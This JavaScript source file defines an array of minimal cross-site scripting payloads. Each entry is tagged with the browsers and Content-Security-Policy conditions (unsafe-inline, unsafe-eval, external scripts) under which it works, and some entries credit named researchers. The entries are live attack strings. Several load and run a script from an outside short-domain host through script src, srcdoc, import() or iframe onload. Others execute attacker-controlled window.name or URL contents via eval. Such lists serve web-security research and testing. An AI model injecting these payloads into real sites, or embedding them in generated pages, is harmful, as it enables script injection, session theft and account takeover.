const TAGS = {
    chrome: 'chromium',
    firefox: 'firefox',
    safari: 'safari',
    firefoxInner: 'firefox-innerHTML',
    unsafeInline: 'script-unsafe-inline',
    inlineStyleAllow: 'style-inline-allowed',
    inlineStyleBlock: 'style-inline-blocked',
    unsafeEval: 'unsafe-eval',
    scripts: 'external-scripts',
    iframes: 'external-iframes',
    controlsLength: 'controls-index-of-iframe',
    controlsName: 'controls-name',
    controlsURL: 'controls-URL',
    notInner: 'not-innerHTML',
}

const PAYLOADS = [
    {
        html: '<script/src=//Ǌ.₨><\/script>',
        tags: [TAGS.scripts, TAGS.notInner],
        author: null,
    },
    {
        html: '<iframe/onload=src=top.name>',
        tags: [TAGS.unsafeInline, TAGS.controlsName],
        author: '@terjanq'
    },
    {
        html: '<iframe/onload=src=top[0].name+/\\Ǌ.₨/>',
        tags: [TAGS.iframes, TAGS.unsafeInline, TAGS.controlsLength],
        author: '@terjanq'
    },
    {
        html: '<iframe/onload=src=contentWindow.name+/\\Ǌ.₨/>',
        tags: [TAGS.iframes, TAGS.unsafeInline],
        author: '@terjanq'
    },
    {
        html: '<iframe/srcdoc="<script/src=//Ǌ.₨><\/script>">',
        tags: [TAGS.scripts],
        author: null,
    },
    {
        html: '<iframe/srcdoc="<svg><script/href=//Ǌ.₨ />">',
        tags: [TAGS.firefox, TAGS.scripts],
        author: null,
    },
    {
        html: "<iframe/onload=eval(`'`+URL)>",
        tags: [TAGS.unsafeEval, TAGS.unsafeInline, TAGS.controlsURL],
        author: '@wcbowling'
    },
    {
        html: "<iframe/onload=write(URL)>",
        tags: [TAGS.safari, TAGS.unsafeInline, TAGS.controlsURL],
        author: '@kinugawamasato'
    },
    {
        html: "<svg/onload=eval(name)>",
        tags: [TAGS.unsafeInline, TAGS.unsafeEval, TAGS.controlsName, TAGS.notInner, TAGS.firefoxInner],
        author: null,
    },
    {
        html: "<svg/onload=eval(`'`+URL)>",
        tags: [TAGS.unsafeInline, TAGS.unsafeEval, TAGS.controlsURL, TAGS.notInner, TAGS.firefoxInner],
        author: '@wcbowling'
    },
    {
        html: "<svg/onload=location=name>",
        tags: [TAGS.unsafeInline, TAGS.controlsName, TAGS.notInner, TAGS.firefoxInner],
        author: null
    },
    {
        html: "<style/onload=eval(name)>",
        tags: [TAGS.inlineStyleAllow, TAGS.controlsName, TAGS.unsafeEval],
        author: null
    },
    {
        html: "<style/onload=write(URL)>",
        tags: [TAGS.safari, TAGS.unsafeInline, TAGS.controlsURL, TAGS.inlineStyleAllow],
        author: '@kinugawamasato'
    },
    {
        html: "<style/onload=eval(`'`+URL)>",
        tags: [TAGS.unsafeEval, TAGS.unsafeInline, TAGS.controlsURL, TAGS.inlineStyleAllow],
        author: '@wcbowling'
    },
    {
        html: "<style/onerror=eval(name)>",
        tags: [TAGS.unsafeEval, TAGS.unsafeInline, TAGS.controlsName, TAGS.inlineStyleBlock],
        author: null
    },
    {
        html: "<svg/onload=import(/\\Ǌ.₨/)>",
        tags: [TAGS.unsafeInline, TAGS.notInner, TAGS.firefoxInner, TAGS.scripts],
        author: null
    },
    {
        html: "<style/onload=import(/\\Ǌ.₨/)>",
        tags: [TAGS.unsafeInline, TAGS.scripts, TAGS.inlineStyleAllow],
        author: null
    },
    {
        html: "<iframe/onload=import(/\\Ǌ.₨/)>",
        tags: [TAGS.unsafeInline, TAGS.scripts],
        author: null
    },
]
